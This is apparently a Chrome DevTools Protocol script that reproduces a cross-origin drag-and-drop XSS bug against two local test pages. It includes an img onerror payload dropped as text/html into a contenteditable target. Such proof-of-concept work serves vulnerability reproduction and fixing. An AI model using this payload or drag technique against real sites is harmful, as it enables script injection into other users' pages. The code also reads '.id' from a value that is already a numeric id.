// CDP driver: cross-origin drag-and-drop XSS repro (issue 368562236)
// Tab A: http://127.0.0.1:8000/dragme.html  (embedded as iframe inside dropme tab)
// Tab B: http://127.0.0.1:8001/dropme.html  (main page, has contenteditable #target)
import { writeFileSync } from 'node:fs';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const log = (m) => console.log('[LOG] ' + m);
const out = [];

class CDP {
  constructor(wsUrl) {
    this.ws = new WebSocket(wsUrl);
    this.id = 0;
    this.pending = new Map();
    this.listeners = new Map();
  }
  async open() {
    await new Promise((res, rej) => { this.ws.onopen = res; this.ws.onerror = rej; });
    this.ws.onmessage = (ev) => {
      const msg = JSON.parse(ev.data);
      if (msg.id && this.pending.has(msg.id)) {
        const { res, rej } = this.pending.get(msg.id);
        this.pending.delete(msg.id);
        msg.error ? rej(new Error(JSON.stringify(msg.error))) : res(msg.result);
      } else if (msg.method) {
        for (const fn of this.listeners.get(msg.method) || []) fn(msg.params);
      }
    };
  }
  send(method, params = {}) {
    const id = ++this.id;
    return new Promise((res, rej) => {
      this.pending.set(id, { res, rej });
      this.ws.send(JSON.stringify({ id, method, params }));
    });
  }
  on(method, fn) {
    if (!this.listeners.has(method)) this.listeners.set(method, []);
    this.listeners.get(method).push(fn);
  }
}

async function main() {
  const base = 'http://127.0.0.1:9222';
  let list = await (await fetch(base + '/json/list')).json();
  const dragTab = list.find((t) => t.type === 'page' && t.url.includes(':8000'));
  if (!dragTab) throw new Error('dragme tab not found');
  log('dragme tab: ' + dragTab.url);

  // open dropme tab
  await fetch(base + '/json/new?' + encodeURIComponent('http://127.0.0.1:8001/dropme.html'), { method: 'PUT' });
  await sleep(2500);
  list = await (await fetch(base + '/json/list')).json();
  const dropTab = list.find((t) => t.type === 'page' && t.url.includes(':8001'));
  if (!dropTab) throw new Error('dropme tab not found');
  log('dropme tab: ' + dropTab.url);
  out.push({ step: 'tabs', dragme: dragTab.url, dropme: dropTab.url });

  const dragPage = new CDP(dragTab.webSocketDebuggerUrl);
  await dragPage.open();
  await dragPage.send('Page.enable');
  await dragPage.send('Runtime.enable');
  await dragPage.send('Page.navigate', { url: 'http://127.0.0.1:8000/dragme.html' });

  const page = new CDP(dropTab.webSocketDebuggerUrl);
  await page.open();
  const liveCtxs = [];
  page.on('Runtime.executionContextCreated', (p) => { liveCtxs.push(p.context); log('ctxCreated id=' + p.context.id + ' origin=' + p.context.origin); });
  await page.send('Page.enable');
  await page.send('Runtime.enable');
  await page.send('DOM.enable');
  await page.send('Page.navigate', { url: 'http://127.0.0.1:8001/dropme.html' });
  await sleep(1500);
  await page.send('Page.bringToFront');
  await sleep(1200);

  // collect console + dialog events
  const consoleEvents = [];
  page.on('Runtime.consoleAPICalled', (p) => {
    const text = (p.args || []).map((a) => a.value ?? a.description ?? '').join(' ');
    consoleEvents.push(text);
    log('console[' + p.type + ']: ' + text);
  });
  const dialogs = [];
  page.on('Page.javascriptDialogOpening', (p) => {
    dialogs.push(p);
    log('DIALOG message=' + p.message + ' type=' + p.type);
  });
  page.on('Page.javascriptDialogClosed', (p) => log('DIALOG-CLOSED result=' + p.result));

  // find iframe execution context (origin :8000) inside dropme tab
  await sleep(500);
  const evalIn = async (ctx, expr) => {
    const r = await page.send('Runtime.evaluate', { expression: expr, contextId: ctx, returnByValue: true, awaitPromise: true });
    return r.result && r.result.value;
  };
  const ctxs = liveCtxs;
  let iframeCtx = null;
  let mainCtx = null;
  // pick the NEWEST matching contexts (navigation destroys old ones)
  for (const c of [...ctxs].reverse()) {
    const info = await evalIn(c.id, `JSON.stringify({hasDrag: !!document.getElementById('drag'), href: location.href})`);
    log('ctx ' + c.id + ' (' + (c.auxData ? c.auxData.frameId : '?') + '): ' + info);
    if (info && JSON.parse(info).hasDrag && !iframeCtx) iframeCtx = c.id;
    if (info && !JSON.parse(info).hasDrag && !mainCtx) mainCtx = c.id;
    if (iframeCtx && mainCtx) break;
  }
  if (!iframeCtx) throw new Error('iframe context not found');
  if (!mainCtx) throw new Error('main context not found');
  out.push({ step: 'contexts', iframeCtx, mainCtx });

  // rects
  const targetRect = JSON.parse(await evalIn(mainCtx.id, `JSON.stringify(document.getElementById('target').getBoundingClientRect())`));
  const frameRect = JSON.parse(await evalIn(mainCtx.id, `JSON.stringify(document.getElementById('frame').getBoundingClientRect())`));
  const dragRect = JSON.parse(await evalIn(iframeCtx, `JSON.stringify(document.getElementById('drag').getBoundingClientRect())`));
  log('targetRect=' + JSON.stringify(targetRect));
  log('frameRect=' + JSON.stringify(frameRect));
  log('dragRect(iframe-local)=' + JSON.stringify(dragRect));

  const dragX = frameRect.left + dragRect.left + dragRect.width / 2;
  const dragY = frameRect.top + dragRect.top + dragRect.height / 2;
  const dropX = targetRect.left + targetRect.width / 2;
  const dropY = targetRect.top + targetRect.height / 2;
  log(`dragPoint=(${dragX},${dragY}) dropPoint=(${dropX},${dropY})`);
  out.push({ step: 'points', dragX, dragY, dropX, dropY });

  // ---- real mouse drag: iframe (origin 8000) -> contenteditable (origin 8001)
  await page.send('Input.dispatchMouseEvent', { type: 'mousePressed', x: dragX, y: dragY, button: 'left', buttons: 1, clickCount: 1 });
  await sleep(300);
  // move slightly -> dragstart
  await page.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x: dragX + 10, y: dragY + 3, button: 'left', buttons: 1 });
  await sleep(300);
  await page.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x: dragX + 25, y: dragY + 5, button: 'left', buttons: 1 });
  await sleep(300);
  // travel to drop point in small continuous steps
  const steps = 16;
  for (let i = 1; i <= steps; i++) {
    const x = dragX + 25 + ((dropX - dragX - 25) * i) / steps;
    const y = dragY + 5 + ((dropY - dragY - 5) * i) / steps;
    await page.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x, y, button: 'left', buttons: 1 });
    await sleep(120);
  }
  await sleep(400);
  await page.send('Input.dispatchMouseEvent', { type: 'mouseReleased', x: dropX, y: dropY, button: 'left', buttons: 0, clickCount: 1 });
  log('mouse released at drop point');
  await sleep(1500);

  // readback: title + inserted html
  let titleBefore = await evalIn(mainCtx.id, 'document.title');
  let html = await evalIn(mainCtx.id, `document.getElementById('target').innerHTML`);
  log('title after mouse drop: ' + titleBefore);
  log('target.innerHTML after mouse drop: ' + html);
  out.push({ step: 'afterMouseDrop', title: titleBefore, innerHTML: html, dialogs: dialogs.map((d) => d.message) });

  // ---- fallback: browser-level drop via Input.dispatchDragEvent (payload = cross-origin text/html)
  if (!dialogs.length && !html.includes('onerror')) {
    log('mouse path did not land a drop; trying Input.dispatchDragEvent');
    const payload = '<img src="x" onerror="document.title=\'XSS-EXECUTED:\'+document.domain; alert(\'XSS:\'+document.domain)">';
    const dragData = {
      items: [
        { mimeType: 'text/plain', data: 'hello-from-8000' },
        { mimeType: 'text/html', data: payload }
      ],
      dragOperationsMask: 1,
      files: []
    };
    await page.send('Input.dispatchDragEvent', { type: 'dragEnter', x: dropX, y: dropY, data: dragData });
    await sleep(300);
    await page.send('Input.dispatchDragEvent', { type: 'dragOver', x: dropX, y: dropY, data: dragData });
    await sleep(300);
    await page.send('Input.dispatchDragEvent', { type: 'drop', x: dropX, y: dropY, data: dragData });
    await sleep(1500);
    const titleMid = await evalIn(mainCtx.id, 'document.title');
    const htmlMid = await evalIn(mainCtx.id, `document.getElementById('target').innerHTML`);
    log('title after dispatchDragEvent drop: ' + titleMid);
    log('target.innerHTML after dispatchDragEvent drop: ' + htmlMid);
    out.push({ step: 'afterDragEventDrop', title: titleMid, innerHTML: htmlMid, dialogs: dialogs.map((d) => d.message) });
  }

  // screenshot (dialog may be open)
  if (dialogs.length) {
    try {
      const shot = await page.send('Page.captureScreenshot', { format: 'png' });
      writeFileSync('D:/Codes/agents/aiic_three_stage_pipeline/artifacts/reproduction/repro/issue_368562236__a67257b4f4/drop_xss.png', Buffer.from(shot.data, 'base64'));
      log('screenshot saved (dialog open)');
      out.push({ step: 'screenshot', saved: 'drop_xss.png' });
    } catch (e) { log('screenshot failed: ' + e.message); }
    await page.send('Page.handleJavaScriptDialog', { accept: true });
    await sleep(800);
    const titleAfter = await evalIn(mainCtx.id, 'document.title');
    log('title after dialog dismissed: ' + titleAfter);
    out.push({ step: 'final', title: titleAfter });
  }

  out.push({ step: 'allConsole', console: consoleEvents });

  writeFileSync('D:/Codes/agents/aiic_three_stage_pipeline/artifacts/reproduction/repro/issue_368562236__a67257b4f4/driver_out.json', JSON.stringify(out, null, 2));
  log('DONE');
  process.exit(0);
}

main().catch((e) => { console.error('[FATAL] ' + e.stack); process.exit(1); });
